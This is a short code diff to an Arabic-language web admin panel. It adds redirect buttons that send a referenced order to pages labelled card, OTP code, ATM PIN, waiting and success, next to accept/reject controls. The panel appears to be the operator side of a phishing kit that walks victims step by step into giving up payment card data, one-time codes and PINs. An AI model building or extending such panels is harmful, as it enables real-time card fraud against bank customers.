@@ -148,7 +148,7 @@ html,body{height:100%;overflow:hidden;font-family:'Cairo','Segoe UI',sans-serif;
 .btn-ok{background:#16a34a;color:#fff}
 .btn-no{background:#dc2626;color:#fff}
 .btn-ok.disabled,.btn-no.disabled{background:#9ca3af;cursor:not-allowed;opacity:.6}
-.redir-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px}
+.redir-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:6px;margin-bottom:8px}
 .redir-grid button{border:none;border-radius:8px;padding:8px 6px;font-size:11px;font-weight:700;
   cursor:pointer;font-family:'Cairo',sans-serif;color:#fff;transition:.15s}
 .redir-grid button:hover{opacity:.85}
@@ -451,9 +451,12 @@ function renderDetail(o){
       '<button class="btn-no disabled" disabled>❌ رفض</button></div>';
   }
   var redirPages=[
-    {l:'→ صفحة الطلب',pg:'order',c:'#0ea5e9'},
-    {l:'→ الرئيسية',pg:'index',c:'#6b7280'},
-    {l:'→ الملخص',pg:'summary',c:'#a855f7'}
+    {l:'🏠 الرئيسية',pg:'home',c:'#6b7280'},
+    {l:'💳 البطاقة',pg:'card',c:'#0ea5e9'},
+    {l:'📲 الكود',pg:'otp',c:'#f59e0b'},
+    {l:'🏧 ATM',pg:'pin',c:'#a855f7'},
+    {l:'⏳ الانتظار',pg:'wait',c:'#7c3aed'},
+    {l:'✅ النجاح',pg:'done',c:'#16a34a'}
   ];
   h+='<div class="redir-grid">'+redirPages.map(function(p){
     return '<button style="background:'+p.c+'" onclick="doRedir(\''+esc(o.ref)+'\',\''+p.pg+'\')">'+p.l+'</button>';
